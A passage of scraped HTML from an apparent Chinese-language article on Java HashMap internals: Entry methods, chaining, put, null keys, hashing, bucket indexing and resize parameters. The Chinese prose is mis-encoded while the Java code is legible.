class=\"n\">k1</span> <span class=\"o\">=</span> <span class=\"n\">getKey</span><span class=\"o\">();</span>\n        <span class=\"n\">Object</span> <span class=\"n\">k2</span> <span class=\"o\">=</span> <span class=\"n\">e</span><span class=\"o\">.</span><span class=\"na\">getKey</span><span class=\"o\">();</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">k1</span> <span class=\"o\">==</span> <span class=\"n\">k2</span> <span class=\"o\">||</span> <span class=\"o\">(</span><span class=\"n\">k1</span> <span class=\"o\">!=</span> <span class=\"kc\">null</span> <span class=\"o\">&amp;&amp;</span> <span class=\"n\">k1</span><span class=\"o\">.</span><span class=\"na\">equals</span><span class=\"o\">(</span><span class=\"n\">k2</span><span class=\"o\">)))</span> <span class=\"o\">{</span>\n            <span class=\"n\">Object</span> <span class=\"n\">v1</span> <span class=\"o\">=</span> <span class=\"n\">getValue</span><span class=\"o\">();</span>\n            <span class=\"n\">Object</span> <span class=\"n\">v2</span> <span class=\"o\">=</span> <span class=\"n\">e</span><span class=\"o\">.</span><span class=\"na\">getValue</span><span class=\"o\">();</span>\n            <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">v1</span> <span class=\"o\">==</span> <span class=\"n\">v2</span> <span class=\"o\">||</span> <span class=\"o\">(</span><span class=\"n\">v1</span> <span class=\"o\">!=</span> <span class=\"kc\">null</span> <span class=\"o\">&amp;&amp;</span> <span class=\"n\">v1</span><span class=\"o\">.</span><span class=\"na\">equals</span><span class=\"o\">(</span><span class=\"n\">v2</span><span class=\"o\">)))</span>\n                <span class=\"k\">return</span> <span class=\"kc\">true</span><span class=\"o\">;</span>\n        <span class=\"o\">}</span>\n        <span class=\"k\">return</span> <span class=\"kc\">false</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kd\">public</span> <span class=\"kd\">final</span> <span class=\"kt\">int</span> <span class=\"nf\">hashCode</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n        <span class=\"k\">return</span> <span class=\"n\">Objects</span><span class=\"o\">.</span><span class=\"na\">hashCode</span><span class=\"o\">(</span><span class=\"n\">getKey</span><span class=\"o\">())</span> <span class=\"o\">^</span> <span class=\"n\">Objects</span><span class=\"o\">.</span><span class=\"na\">hashCode</span><span class=\"o\">(</span><span class=\"n\">getValue</span><span class=\"o\">());</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kd\">public</span> <span class=\"kd\">final</span> <span class=\"n\">String</span> <span class=\"nf\">toString</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n        <span class=\"k\">return</span> <span class=\"n\">getKey</span><span class=\"o\">()</span> <span class=\"o\">+</span> <span class=\"s\">&#34;=&#34;</span> <span class=\"o\">+</span> <span class=\"n\">getValue</span><span class=\"o\">();</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span></code></pre></div><h3>2. æ‹‰é“¾æ³•çš„å·¥ä½œåŸç†</h3><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"n\">HashMap</span><span class=\"o\">&lt;</span><span class=\"n\">String</span><span class=\"o\">,</span> <span class=\"n\">String</span><span class=\"o\">&gt;</span> <span class=\"n\">map</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">HashMap</span><span class=\"o\">&lt;&gt;();</span>\n<span class=\"n\">map</span><span class=\"o\">.</span><span class=\"na\">put</span><span class=\"o\">(</span><span class=\"s\">&#34;K1&#34;</span><span class=\"o\">,</span> <span class=\"s\">&#34;V1&#34;</span><span class=\"o\">);</span>\n<span class=\"n\">map</span><span class=\"o\">.</span><span class=\"na\">put</span><span class=\"o\">(</span><span class=\"s\">&#34;K2&#34;</span><span class=\"o\">,</span> <span class=\"s\">&#34;V2&#34;</span><span class=\"o\">);</span>\n<span class=\"n\">map</span><span class=\"o\">.</span><span class=\"na\">put</span><span class=\"o\">(</span><span class=\"s\">&#34;K3&#34;</span><span class=\"o\">,</span> <span class=\"s\">&#34;V3&#34;</span><span class=\"o\">);</span></code></pre></div><ul><li>æ–°å»ºä¸€ä¸ª HashMapï¼Œé»˜è®¤å¤§å°ä¸º 16ï¼›</li><li>æ’å…¥ &lt;K1,V1&gt; é”®å€¼å¯¹ï¼Œå…ˆè®¡ç®— K1 çš„ hashCode ä¸º 115ï¼Œä½¿ç”¨é™¤ç•™ä½™æ•°æ³•å¾—åˆ°æ‰€åœ¨çš„æ¡¶ä¸‹æ ‡ 115%16=3ã€‚</li><li>æ’å…¥ &lt;K2,V2&gt; é”®å€¼å¯¹ï¼Œå…ˆè®¡ç®— K2 çš„ hashCode ä¸º 118ï¼Œä½¿ç”¨é™¤ç•™ä½™æ•°æ³•å¾—åˆ°æ‰€åœ¨çš„æ¡¶ä¸‹æ ‡ 118%16=6ã€‚</li><li>æ’å…¥ &lt;K3,V3&gt; é”®å€¼å¯¹ï¼Œå…ˆè®¡ç®— K3 çš„ hashCode ä¸º 118ï¼Œä½¿ç”¨é™¤ç•™ä½™æ•°æ³•å¾—åˆ°æ‰€åœ¨çš„æ¡¶ä¸‹æ ‡ 118%16=6ï¼Œæ’åœ¨ &lt;K2,V2&gt; å‰é¢ã€‚</li></ul><p>åº”è¯¥æ³¨æ„åˆ°é“¾è¡¨çš„æ’å…¥æ˜¯ä»¥å¤´æ’æ³•æ–¹å¼è¿›è¡Œçš„ï¼Œä¾‹å¦‚ä¸Šé¢çš„ &lt;K3,V3&gt; ä¸æ˜¯æ’åœ¨ &lt;K2,V2&gt; åé¢ï¼Œè€Œæ˜¯æ’å…¥åœ¨é“¾è¡¨å¤´éƒ¨ã€‚</p><p>æŸ¥æ‰¾éœ€è¦åˆ†æˆä¸¤æ­¥è¿›è¡Œï¼š</p><ul><li>è®¡ç®—é”®å€¼å¯¹æ‰€åœ¨çš„æ¡¶ï¼›</li><li>åœ¨é“¾è¡¨ä¸Šé¡ºåºæŸ¥æ‰¾ï¼Œæ—¶é—´å¤æ‚åº¦æ˜¾ç„¶å’Œé“¾è¡¨çš„é•¿åº¦æˆæ­£æ¯”ã€‚</li></ul><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-d5318e01448321e5217d2fac19da8275_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"948\" data-rawheight=\"516\" class=\"origin_image zh-lightbox-thumb\" width=\"948\" data-original=\"https://pic2.zhimg.com/v2-d5318e01448321e5217d2fac19da8275_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;948&#39; height=&#39;516&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"948\" data-rawheight=\"516\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"948\" data-original=\"https://pic2.zhimg.com/v2-d5318e01448321e5217d2fac19da8275_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-d5318e01448321e5217d2fac19da8275_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h3>3. put æ“ä½œ</h3><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"n\">V</span> <span class=\"nf\">put</span><span class=\"o\">(</span><span class=\"n\">K</span> <span class=\"n\">key</span><span class=\"o\">,</span> <span class=\"n\">V</span> <span class=\"n\">value</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">table</span> <span class=\"o\">==</span> <span class=\"n\">EMPTY_TABLE</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"n\">inflateTable</span><span class=\"o\">(</span><span class=\"n\">threshold</span><span class=\"o\">);</span>\n    <span class=\"o\">}</span>\n    <span class=\"c1\">// é”®ä¸º null å•ç‹¬å¤„ç†\n</span><span class=\"c1\"></span>    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">key</span> <span class=\"o\">==</span> <span class=\"kc\">null</span><span class=\"o\">)</span>\n        <span class=\"k\">return</span> <span class=\"n\">putForNullKey</span><span class=\"o\">(</span><span class=\"n\">value</span><span class=\"o\">);</span>\n    <span class=\"kt\">int</span> <span class=\"n\">hash</span> <span class=\"o\">=</span> <span class=\"n\">hash</span><span class=\"o\">(</span><span class=\"n\">key</span><span class=\"o\">);</span>\n    <span class=\"c1\">// ç¡®å®šæ¡¶ä¸‹æ ‡\n</span><span class=\"c1\"></span>    <span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">indexFor</span><span class=\"o\">(</span><span class=\"n\">hash</span><span class=\"o\">,</span> <span class=\"n\">table</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">);</span>\n    <span class=\"c1\">// å…ˆæ‰¾å‡ºæ˜¯å¦å·²ç»å­˜åœ¨é”®ä¸º key çš„é”®å€¼å¯¹ï¼Œå¦‚æœå­˜åœ¨çš„è¯å°±æ›´æ–°è¿™ä¸ªé”®å€¼å¯¹çš„å€¼ä¸º value\n</span><span class=\"c1\"></span>    <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"n\">Entry</span><span class=\"o\">&lt;</span><span class=\"n\">K</span><span class=\"o\">,</span><span class=\"n\">V</span><span class=\"o\">&gt;</span> <span class=\"n\">e</span> <span class=\"o\">=</span> <span class=\"n\">table</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">];</span> <span class=\"n\">e</span> <span class=\"o\">!=</span> <span class=\"kc\">null</span><span class=\"o\">;</span> <span class=\"n\">e</span> <span class=\"o\">=</span> <span class=\"n\">e</span><span class=\"o\">.</span><span class=\"na\">next</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"n\">Object</span> <span class=\"n\">k</span><span class=\"o\">;</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">e</span><span class=\"o\">.</span><span class=\"na\">hash</span> <span class=\"o\">==</span> <span class=\"n\">hash</span> <span class=\"o\">&amp;&amp;</span> <span class=\"o\">((</span><span class=\"n\">k</span> <span class=\"o\">=</span> <span class=\"n\">e</span><span class=\"o\">.</span><span class=\"na\">key</span><span class=\"o\">)</span> <span class=\"o\">==</span> <span class=\"n\">key</span> <span class=\"o\">||</span> <span class=\"n\">key</span><span class=\"o\">.</span><span class=\"na\">equals</span><span class=\"o\">(</span><span class=\"n\">k</span><span class=\"o\">)))</span> <span class=\"o\">{</span>\n            <span class=\"n\">V</span> <span class=\"n\">oldValue</span> <span class=\"o\">=</span> <span class=\"n\">e</span><span class=\"o\">.</span><span class=\"na\">value</span><span class=\"o\">;</span>\n            <span class=\"n\">e</span><span class=\"o\">.</span><span class=\"na\">value</span> <span class=\"o\">=</span> <span class=\"n\">value</span><span class=\"o\">;</span>\n            <span class=\"n\">e</span><span class=\"o\">.</span><span class=\"na\">recordAccess</span><span class=\"o\">(</span><span class=\"k\">this</span><span class=\"o\">);</span>\n            <span class=\"k\">return</span> <span class=\"n\">oldValue</span><span class=\"o\">;</span>\n        <span class=\"o\">}</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"n\">modCount</span><span class=\"o\">++;</span>\n    <span class=\"c1\">// æ’å…¥æ–°é”®å€¼å¯¹\n</span><span class=\"c1\"></span>    <span class=\"n\">addEntry</span><span class=\"o\">(</span><span class=\"n\">hash</span><span class=\"o\">,</span> <span class=\"n\">key</span><span class=\"o\">,</span> <span class=\"n\">value</span><span class=\"o\">,</span> <span class=\"n\">i</span><span class=\"o\">);</span>\n    <span class=\"k\">return</span> <span class=\"kc\">null</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><p>HashMap å…è®¸æ’å…¥é”®ä¸º null çš„é”®å€¼å¯¹ã€‚ä½†æ˜¯å› ä¸ºæ— æ³•è°ƒç”¨ null çš„ hashCode() æ–¹æ³•ï¼Œä¹Ÿå°±æ— æ³•ç¡®å®šè¯¥é”®å€¼å¯¹çš„æ¡¶ä¸‹æ ‡ï¼Œåªèƒ½é€šè¿‡å¼ºåˆ¶æŒ‡å®šä¸€ä¸ªæ¡¶ä¸‹æ ‡æ¥å­˜æ”¾ã€‚HashMap ä½¿ç”¨ç¬¬ 0 ä¸ªæ¡¶å­˜æ”¾é”®ä¸º null çš„é”®å€¼å¯¹ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">private</span> <span class=\"n\">V</span> <span class=\"nf\">putForNullKey</span><span class=\"o\">(</span><span class=\"n\">V</span> <span class=\"n\">value</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"n\">Entry</span><span class=\"o\">&lt;</span><span class=\"n\">K</span><span class=\"o\">,</span><span class=\"n\">V</span><span class=\"o\">&gt;</span> <span class=\"n\">e</span> <span class=\"o\">=</span> <span class=\"n\">table</span><span class=\"o\">[</span><span class=\"n\">0</span><span class=\"o\">];</span> <span class=\"n\">e</span> <span class=\"o\">!=</span> <span class=\"kc\">null</span><span class=\"o\">;</span> <span class=\"n\">e</span> <span class=\"o\">=</span> <span class=\"n\">e</span><span class=\"o\">.</span><span class=\"na\">next</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">e</span><span class=\"o\">.</span><span class=\"na\">key</span> <span class=\"o\">==</span> <span class=\"kc\">null</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n            <span class=\"n\">V</span> <span class=\"n\">oldValue</span> <span class=\"o\">=</span> <span class=\"n\">e</span><span class=\"o\">.</span><span class=\"na\">value</span><span class=\"o\">;</span>\n            <span class=\"n\">e</span><span class=\"o\">.</span><span class=\"na\">value</span> <span class=\"o\">=</span> <span class=\"n\">value</span><span class=\"o\">;</span>\n            <span class=\"n\">e</span><span class=\"o\">.</span><span class=\"na\">recordAccess</span><span class=\"o\">(</span><span class=\"k\">this</span><span class=\"o\">);</span>\n            <span class=\"k\">return</span> <span class=\"n\">oldValue</span><span class=\"o\">;</span>\n        <span class=\"o\">}</span>\n    <span class=\"o\">}</span>\n    <span class=\"n\">modCount</span><span class=\"o\">++;</span>\n    <span class=\"n\">addEntry</span><span class=\"o\">(</span><span class=\"n\">0</span><span class=\"o\">,</span> <span class=\"kc\">null</span><span class=\"o\">,</span> <span class=\"n\">value</span><span class=\"o\">,</span> <span class=\"n\">0</span><span class=\"o\">);</span>\n    <span class=\"k\">return</span> <span class=\"kc\">null</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><p>ä½¿ç”¨é“¾è¡¨çš„å¤´æ’æ³•ï¼Œä¹Ÿå°±æ˜¯æ–°çš„é”®å€¼å¯¹æ’åœ¨é“¾è¡¨çš„å¤´éƒ¨ï¼Œè€Œä¸æ˜¯é“¾è¡¨çš„å°¾éƒ¨ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kt\">void</span> <span class=\"nf\">addEntry</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">hash</span><span class=\"o\">,</span> <span class=\"n\">K</span> <span class=\"n\">key</span><span class=\"o\">,</span> <span class=\"n\">V</span> <span class=\"n\">value</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">bucketIndex</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">if</span> <span class=\"o\">((</span><span class=\"n\">size</span> <span class=\"o\">&gt;=</span> <span class=\"n\">threshold</span><span class=\"o\">)</span> <span class=\"o\">&amp;&amp;</span> <span class=\"o\">(</span><span class=\"kc\">null</span> <span class=\"o\">!=</span> <span class=\"n\">table</span><span class=\"o\">[</span><span class=\"n\">bucketIndex</span><span class=\"o\">]))</span> <span class=\"o\">{</span>\n        <span class=\"n\">resize</span><span class=\"o\">(</span><span class=\"n\">2</span> <span class=\"o\">*</span> <span class=\"n\">table</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">);</span>\n        <span class=\"n\">hash</span> <span class=\"o\">=</span> <span class=\"o\">(</span><span class=\"kc\">null</span> <span class=\"o\">!=</span> <span class=\"n\">key</span><span class=\"o\">)</span> <span class=\"o\">?</span> <span class=\"n\">hash</span><span class=\"o\">(</span><span class=\"n\">key</span><span class=\"o\">)</span> <span class=\"o\">:</span> <span class=\"n\">0</span><span class=\"o\">;</span>\n        <span class=\"n\">bucketIndex</span> <span class=\"o\">=</span> <span class=\"n\">indexFor</span><span class=\"o\">(</span><span class=\"n\">hash</span><span class=\"o\">,</span> <span class=\"n\">table</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">);</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"n\">createEntry</span><span class=\"o\">(</span><span class=\"n\">hash</span><span class=\"o\">,</span> <span class=\"n\">key</span><span class=\"o\">,</span> <span class=\"n\">value</span><span class=\"o\">,</span> <span class=\"n\">bucketIndex</span><span class=\"o\">);</span>\n<span class=\"o\">}</span>\n\n<span class=\"kt\">void</span> <span class=\"nf\">createEntry</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">hash</span><span class=\"o\">,</span> <span class=\"n\">K</span> <span class=\"n\">key</span><span class=\"o\">,</span> <span class=\"n\">V</span> <span class=\"n\">value</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">bucketIndex</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"n\">Entry</span><span class=\"o\">&lt;</span><span class=\"n\">K</span><span class=\"o\">,</span><span class=\"n\">V</span><span class=\"o\">&gt;</span> <span class=\"n\">e</span> <span class=\"o\">=</span> <span class=\"n\">table</span><span class=\"o\">[</span><span class=\"n\">bucketIndex</span><span class=\"o\">];</span>\n    <span class=\"c1\">// å¤´æ’æ³•ï¼Œé“¾è¡¨å¤´éƒ¨æŒ‡å‘æ–°çš„é”®å€¼å¯¹\n</span><span class=\"c1\"></span>    <span class=\"n\">table</span><span class=\"o\">[</span><span class=\"n\">bucketIndex</span><span class=\"o\">]</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Entry</span><span class=\"o\">&lt;&gt;(</span><span class=\"n\">hash</span><span class=\"o\">,</span> <span class=\"n\">key</span><span class=\"o\">,</span> <span class=\"n\">value</span><span class=\"o\">,</span> <span class=\"n\">e</span><span class=\"o\">);</span>\n    <span class=\"n\">size</span><span class=\"o\">++;</span>\n<span class=\"o\">}</span>\n<span class=\"n\">Entry</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">h</span><span class=\"o\">,</span> <span class=\"n\">K</span> <span class=\"n\">k</span><span class=\"o\">,</span> <span class=\"n\">V</span> <span class=\"n\">v</span><span class=\"o\">,</span> <span class=\"n\">Entry</span><span class=\"o\">&lt;</span><span class=\"n\">K</span><span class=\"o\">,</span><span class=\"n\">V</span><span class=\"o\">&gt;</span> <span class=\"n\">n</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"n\">value</span> <span class=\"o\">=</span> <span class=\"n\">v</span><span class=\"o\">;</span>\n    <span class=\"n\">next</span> <span class=\"o\">=</span> <span class=\"n\">n</span><span class=\"o\">;</span>\n    <span class=\"n\">key</span> <span class=\"o\">=</span> <span class=\"n\">k</span><span class=\"o\">;</span>\n    <span class=\"n\">hash</span> <span class=\"o\">=</span> <span class=\"n\">h</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><h3>4. ç¡®å®šæ¡¶ä¸‹æ ‡</h3><p>å¾ˆå¤šæ“ä½œéƒ½éœ€è¦å…ˆç¡®å®šä¸€ä¸ªé”®å€¼å¯¹æ‰€åœ¨çš„æ¡¶ä¸‹æ ‡ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kt\">int</span> <span class=\"n\">hash</span> <span class=\"o\">=</span> <span class=\"n\">hash</span><span class=\"o\">(</span><span class=\"n\">key</span><span class=\"o\">);</span>\n<span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">indexFor</span><span class=\"o\">(</span><span class=\"n\">hash</span><span class=\"o\">,</span> <span class=\"n\">table</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">);</span></code></pre></div><p><b>4.1 è®¡ç®— hash å€¼</b> </p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">final</span> <span class=\"kt\">int</span> <span class=\"nf\">hash</span><span class=\"o\">(</span><span class=\"n\">Object</span> <span class=\"n\">k</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"kt\">int</span> <span class=\"n\">h</span> <span class=\"o\">=</span> <span class=\"n\">hashSeed</span><span class=\"o\">;</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">0</span> <span class=\"o\">!=</span> <span class=\"n\">h</span> <span class=\"o\">&amp;&amp;</span> <span class=\"n\">k</span> <span class=\"k\">instanceof</span> <span class=\"n\">String</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"k\">return</span> <span class=\"n\">sun</span><span class=\"o\">.</span><span class=\"na\">misc</span><span class=\"o\">.</span><span class=\"na\">Hashing</span><span class=\"o\">.</span><span class=\"na\">stringHash32</span><span class=\"o\">((</span><span class=\"n\">String</span><span class=\"o\">)</span> <span class=\"n\">k</span><span class=\"o\">);</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"n\">h</span> <span class=\"o\">^=</span> <span class=\"n\">k</span><span class=\"o\">.</span><span class=\"na\">hashCode</span><span class=\"o\">();</span>\n\n    <span class=\"c1\">// This function ensures that hashCodes that differ only by\n</span><span class=\"c1\"></span>    <span class=\"c1\">// constant multiples at each bit position have a bounded\n</span><span class=\"c1\"></span>    <span class=\"c1\">// number of collisions (approximately 8 at default load factor).\n</span><span class=\"c1\"></span>    <span class=\"n\">h</span> <span class=\"o\">^=</span> <span class=\"o\">(</span><span class=\"n\">h</span> <span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">20</span><span class=\"o\">)</span> <span class=\"o\">^</span> <span class=\"o\">(</span><span class=\"n\">h</span> <span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">12</span><span class=\"o\">);</span>\n    <span class=\"k\">return</span> <span class=\"n\">h</span> <span class=\"o\">^</span> <span class=\"o\">(</span><span class=\"n\">h</span> <span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">7</span><span class=\"o\">)</span> <span class=\"o\">^</span> <span class=\"o\">(</span><span class=\"n\">h</span> <span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">4</span><span class=\"o\">);</span>\n<span class=\"o\">}</span>\n<span class=\"kd\">public</span> <span class=\"kd\">final</span> <span class=\"kt\">int</span> <span class=\"nf\">hashCode</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n    <span class=\"k\">return</span> <span class=\"n\">Objects</span><span class=\"o\">.</span><span class=\"na\">hashCode</span><span class=\"o\">(</span><span class=\"n\">key</span><span class=\"o\">)</span> <span class=\"o\">^</span> <span class=\"n\">Objects</span><span class=\"o\">.</span><span class=\"na\">hashCode</span><span class=\"o\">(</span><span class=\"n\">value</span><span class=\"o\">);</span>\n<span class=\"o\">}</span></code></pre></div><p><b>4.2 å–æ¨¡</b> </p><p>ä»¤ x = 1&lt;&lt;4ï¼Œå³ x ä¸º 2 çš„ 4 æ¬¡æ–¹ï¼Œå®ƒå…·æœ‰ä»¥ä¸‹æ€§è´¨ï¼š</p><div class=\"highlight\"><pre><code class=\"language-text\">x   : 00010000\nx-1 : 00001111</code></pre></div><p>ä»¤ä¸€ä¸ªæ•° y ä¸ x-1 åšä¸è¿ç®—ï¼Œå¯ä»¥å»é™¤ y ä½çº§è¡¨ç¤ºçš„ç¬¬ 4 ä½ä»¥ä¸Šæ•°ï¼š</p><div class=\"highlight\"><pre><code class=\"language-text\">y       : 10110010\nx-1     : 00001111\ny&amp;(x-1) : 00000010</code></pre></div><p>è¿™ä¸ªæ€§è´¨å’Œ y å¯¹ x å–æ¨¡æ•ˆæœæ˜¯ä¸€æ ·çš„ï¼š</p><div class=\"highlight\"><pre><code class=\"language-text\">y   : 10110010\nx   : 00010000\ny%x : 00000010</code></pre></div><p>æˆ‘ä»¬çŸ¥é“ï¼Œä½è¿ç®—çš„ä»£ä»·æ¯”æ±‚æ¨¡è¿ç®—å°çš„å¤šï¼Œå› æ­¤åœ¨è¿›è¡Œè¿™ç§è®¡ç®—æ—¶ç”¨ä½è¿ç®—çš„è¯èƒ½å¸¦æ¥æ›´é«˜çš„æ€§èƒ½ã€‚</p><p>ç¡®å®šæ¡¶ä¸‹æ ‡çš„æœ€åä¸€æ­¥æ˜¯å°† key çš„ hash å€¼å¯¹æ¡¶ä¸ªæ•°å–æ¨¡ï¼šhash%capacityï¼Œå¦‚æœèƒ½ä¿è¯ capacity ä¸º 2 çš„ n æ¬¡æ–¹ï¼Œé‚£ä¹ˆå°±å¯ä»¥å°†è¿™ä¸ªæ“ä½œè½¬æ¢ä¸ºä½è¿ç®—ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">static</span> <span class=\"kt\">int</span> <span class=\"nf\">indexFor</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">h</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">length</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">return</span> <span class=\"n\">h</span> <span class=\"o\">&amp;</span> <span class=\"o\">(</span><span class=\"n\">length</span><span class=\"o\">-</span><span class=\"n\">1</span><span class=\"o\">);</span>\n<span class=\"o\">}</span></code></pre></div><h3>5. æ‰©å®¹-åŸºæœ¬åŸç†</h3><p>è®¾ HashMap çš„ table é•¿åº¦ä¸º Mï¼Œéœ€è¦å­˜å‚¨çš„é”®å€¼å¯¹æ•°é‡ä¸º Nï¼Œå¦‚æœå“ˆå¸Œå‡½æ•°æ»¡è¶³å‡åŒ€æ€§çš„è¦æ±‚ï¼Œé‚£ä¹ˆæ¯æ¡é“¾è¡¨çš„é•¿åº¦å¤§çº¦ä¸º N/Mï¼Œå› æ­¤å¹³å‡æŸ¥æ‰¾æ¬¡æ•°çš„å¤æ‚åº¦ä¸º O(N/M)ã€‚</p><p>ä¸ºäº†è®©æŸ¥æ‰¾çš„æˆæœ¬é™ä½ï¼Œåº”è¯¥å°½å¯èƒ½ä½¿å¾— N/M å°½å¯èƒ½å°ï¼Œå› æ­¤éœ€è¦ä¿è¯ M å°½å¯èƒ½å¤§ï¼Œä¹Ÿå°±æ˜¯è¯´ table è¦å°½å¯èƒ½å¤§ã€‚HashMap é‡‡ç”¨åŠ¨æ€æ‰©å®¹æ¥æ ¹æ®å½“å‰çš„ N å€¼æ¥è°ƒæ•´ M å€¼ï¼Œä½¿å¾—ç©ºé—´æ•ˆç‡å’Œæ—¶é—´æ•ˆç‡éƒ½èƒ½å¾—åˆ°ä¿è¯ã€‚</p><p>å’Œæ‰©å®¹ç›¸å…³çš„å‚æ•°ä¸»è¦æœ‰ï¼šcapacityã€sizeã€threshold å’Œ load_factorã€‚</p><p>| å‚æ•° | å«ä¹‰ | | :--: | :-- | | capacity | table çš„å®¹é‡å¤§å°ï¼Œé»˜è®¤ä¸º 16ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ capacity å¿…é¡»ä¿è¯ä¸º 2 çš„ n æ¬¡æ–¹ã€‚| | size | é”®å€¼å¯¹æ•°é‡ã€‚ | | threshold | size çš„ä¸´ç•Œå€¼ï¼Œå½“ size å¤§äºç­‰äº threshold å°±å¿…é¡»è¿›è¡Œæ‰©å®¹æ“ä½œã€‚ | | loadFactor | è£…è½½å› å­ï¼Œtable èƒ½å¤Ÿä½¿ç”¨çš„æ¯”ä¾‹ï¼Œthreshold = capacity * loadFactorã€‚|</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">static</span> <span class=\"kd\">final</span> <span class=\"kt\">int</span> <span class=\"n\">DEFAULT_INITIAL_CAPACITY</span> <span class=\"o\">=</span> <span class=\"n\">16</span><span class=\"o\">;</span>\n\n<span class=\"kd\">static</span> <span class=\"kd\">final</span> <span class=\"kt\">int</span> <span class=\"n\">MAXIMUM_CAPACITY</span> <span class=\"o\">=</span> <span class=\"n\">1</span> <span class=\"o\">&lt;&lt;</span> <span class=\"n\">30</span><span class=\"o\">;</span>\n\n<span class=\"kd\">static</span> <span class=\"kd\">final</span> <span class=\"kt\">float</span> <span class=\"n\">DEFAULT_LOAD_FACTOR</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">.</span><span class=\"na\">75f</span><span class=\"o\">;</span>\n\n<span class=\"kd\">transient</span> <span class=\"n\">Entry</span><span class=\"o\">[]</span> <span class=\"n\">table</span><span class=\"o\">;</span>\n\n<span class=\"kd\">transient</span> <span class=\"kt\">int</span> <span class=\"n\">size</span><span class=\"o\">;</span>\n\n<span class=\"kt\">int</span> <span class=\"n\">threshold</span><span class=\"o\">;</span>\n\n<span class=\"kd\">final</span> <span class=\"kt\">float</span> <span class=\"n\">loadFactor</span><span class=\"o\">;</span>\n\n<span class=\"kd\">transient</span> <span class=\"kt\">int</span> <span class=\"n\">modCount</span><span class=\"o\">;</span></code></pre></div><p>ä»ä¸‹é¢çš„æ·»åŠ å…ƒç´ ä»£ç ä¸­å¯ä»¥çœ‹å‡ºï¼Œå½“éœ€è¦æ‰©å®¹æ—¶ï¼Œä»¤ capacity ä¸ºåŸæ¥çš„ä¸¤å€ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kt\">void</span> <span class=\"nf\">addEntry</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">hash</span><span class=\"o\">,</span> <span class=\"n\">K</span> <span class=\"n\">key</span><span class=\"o\">,</span> <span 